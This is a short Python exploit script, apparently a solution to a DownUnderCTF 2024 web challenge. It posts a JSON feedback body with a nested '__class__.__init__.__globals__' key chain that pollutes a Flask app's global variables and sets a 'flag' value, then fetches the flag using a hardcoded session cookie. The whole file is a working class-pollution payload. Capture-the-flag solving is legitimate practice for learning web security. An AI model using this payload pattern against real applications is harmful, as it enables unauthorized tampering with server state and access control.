import requests

# url = "http://localhost:8888"
url = "https://web-co2-9a13ebd2da030b42.2024.ductf.dev"

token = ".eJwlzjESAjEIAMC_pLaAJAS4z9wEAqPtnVc5_l0d6232VfY84ryX7XlccSv7Y5WtZIKgY2ZfxI4ztIqSSCJDwAI3HOgWQY17pzGlGVYedZlgEIKBKtCglMXa2LmHmLo7a13Q6qxGvQ_vkGZo9sMxkzwpRKN8I9cZx39Ty_sDsawvfg.ZogGoQ.DVOaVTejSxgMsXsZ1xaSh-xPmCI"

r = requests.post(
    f"{url}/save_feedback",
    cookies={"session": token},
    json={
        "title": "asdf", 
        "content": "asdf", 
        "rating": "12", 
        "referred": "asdf",
        "__class__": {"__init__": {"__globals__": {"flag": "true"}}}
    }
)

print(r.text) 

r = requests.get(
    f"{url}/get_flag",
    cookies={"session": token},
)
print(r.text) 